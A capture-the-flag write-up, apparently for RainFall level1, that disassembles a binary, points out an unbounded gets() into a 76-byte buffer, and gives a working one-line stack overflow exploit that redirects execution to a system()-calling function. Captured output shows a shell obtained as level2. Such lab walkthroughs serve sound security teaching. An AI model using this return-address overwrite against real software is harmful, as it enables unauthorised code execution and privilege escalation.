```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```




```
08048444 <run>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
 804844f:       89 c2                   mov    %eax,%edx
 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
 8048461:       00
 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048469:       00
 804846a:       89 04 24                mov    %eax,(%esp)
 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
 804847e:       c9                      leave
 804847f:       c3                      ret

08048480 <main>:
 8048480:       55                      push   %ebp
 8048481:       89 e5                   mov    %esp,%ebp
 8048483:       83 e4 f0                and    $0xfffffff0,%esp
 8048486:       83 ec 50                sub    $0x50,%esp
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
 804848d:       89 04 24                mov    %eax,(%esp)
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 8048495:       c9                      leave
 8048496:       c3                      ret
```


```
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
```


```
08048444 <run> = \x44\x84\x04\x08 little endian
```

We are basically know that the buffer overflow is happening here:
```
void main(void)

{
  char local_50 [76];

  gets(local_50);
  return;
}
```

So, we need to overflow the buffer to overwrite the return address and redirect execution to the `run` function.

The buffer overflow vulnerability exists because `gets()` reads user input without bounds checking into a fixed-size buffer.

### Key Details:
1. The buffer size is **76 bytes** (`local_50[76]`).
2. We need to **overflow this buffer** to reach and overwrite the return address.
3. The target address we want to jump to is the `run()` function at **0x08048444**.

### To Exploit This:
1. Fill the buffer with **76 bytes of padding** to reach the return address.
2. Overwrite the return address with the **address of `run()` (0x08048444)**.

Exploit:
```
 (python -c 'print("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
```

```
level1@RainFall:~$  (python -c 'print("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
whoami
level2
```

```
https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3.html
```
